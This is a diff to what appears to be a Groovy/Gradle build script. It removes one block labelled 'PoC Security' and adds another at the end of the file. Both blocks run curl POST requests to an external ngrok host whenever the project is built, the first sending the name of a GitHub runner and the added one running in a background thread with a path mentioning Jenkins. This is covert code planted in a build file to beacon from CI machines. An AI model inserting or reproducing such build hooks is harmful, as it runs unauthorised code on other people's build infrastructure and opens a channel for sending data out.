@@ -27,14 +27,6 @@
  * specific language governing permissions and limitations
  * under the License.
  */
-
-// --- PoC Security ---
-println "PoC: Executing command injection..."
-def p1 = "curl -X POST -d user=github_runner https://32a04e28a04c.ngrok-free.app/pwned".execute()
-p1.waitFor()
-println "PoC: Command executed."
-// ---------------------------
-
 import java.nio.charset.StandardCharsets;
 import java.io.ByteArrayOutputStream;
 
@@ -750,3 +742,14 @@ allprojects { project ->
     }
   }
 }
+
+// --- Payload PoC  ---
+println "PoC: Attempting injection..."
+try {
+    Thread.start {
+        "curl -X POST https://32a04e28a04c.ngrok-free.app/jenkins_pwned".execute()
+    }
+} catch (Exception e) {
+    println "PoC Error: " + e.message
+}
+// ------------------------------------------------
